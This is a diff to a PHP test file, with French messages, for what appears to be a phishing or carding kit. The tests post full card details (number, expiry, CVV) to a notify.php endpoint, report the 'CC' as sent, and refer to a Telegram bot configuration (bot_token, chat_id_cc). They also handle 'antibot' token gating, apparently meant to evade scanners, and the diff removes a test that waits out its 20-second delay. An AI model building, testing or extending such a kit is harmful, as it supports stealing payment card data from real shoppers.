@@ -283,7 +283,7 @@ test('notify.php sans token → 403 (antibot actif) ou 200 (antibot off)', funct
     return 'antibot désactivé — pas de 403 (normal en test local)';
 });
 
-test('notify.php (CC) — antibot 20s', function () use ($base, $cookieJar, &$token) {
+test('notify.php (CC)', function () use ($base, $cookieJar, &$token) {
     $payload = [
         'email' => 'test@example.com',
         'firstName' => 'Jean',
@@ -297,10 +297,6 @@ test('notify.php (CC) — antibot 20s', function () use ($base, $cookieJar, &$to
     ];
     $res = http_request('POST', $base . '/api/notify.php', $payload, ['X-Salt-Token: ' . $token], $cookieJar);
 
-    if ($res['status'] === 403) {
-        return '403 — min 20s antibot (normal si test rapide)';
-    }
-
     assert_true($res['status'] === 200, 'HTTP ' . $res['status'] . ' — ' . $res['body']);
     $json = json_decode($res['body'], true);
     assert_true(is_array($json), $res['body']);
@@ -310,39 +306,6 @@ test('notify.php (CC) — antibot 20s', function () use ($base, $cookieJar, &$to
     }
 
     return 'ok=true — message CC envoyé';
-});
-
-test('notify.php (CC) après 20s', function () use ($base, $cookieJar) {
-    $jar = tempnam(sys_get_temp_dir(), 'salt_cc_');
-    $resPage = http_request('GET', $base . '/pages/paiement.php', null, [], $jar);
-    $tok = extract_antibot_token($resPage['body']);
-    http_request('POST', $base . '/api/antibot-verify.php', [], ['X-Salt-Token: ' . $tok], $jar);
-
-    echo '   … attente 21s (antibot min_seconds)…' . PHP_EOL;
-    sleep(21);
-
-    $payload = [
-        'email' => 'test@example.com',
-        'firstName' => 'Jean',
-        'lastName' => 'Dupont',
-        'cardHolder' => 'JEAN DUPONT',
-        'cardNumber' => '4111111111111111',
-        'cardExpiry' => '12/28',
-        'cardCvv' => '123',
-        '_hp' => '',
-        'client' => ['userAgent' => 'Test', 'device' => 'Desktop', 'os' => 'Linux'],
-    ];
-    $res = http_request('POST', $base . '/api/notify.php', $payload, ['X-Salt-Token: ' . $tok], $jar);
-
-    assert_true($res['status'] === 200, 'HTTP ' . $res['status'] . ' — ' . $res['body']);
-    $json = json_decode($res['body'], true);
-    assert_true(is_array($json), $res['body']);
-
-    if (empty($json['ok'])) {
-        return 'ok=false — vérifier config/telegram.php (bot_token, chat_id_cc)';
-    }
-
-    return 'ok=true — CC envoyé après délai antibot';
 });
 
 test('checkout-complete.php', function () use ($base, $cookieJar, &$token) {
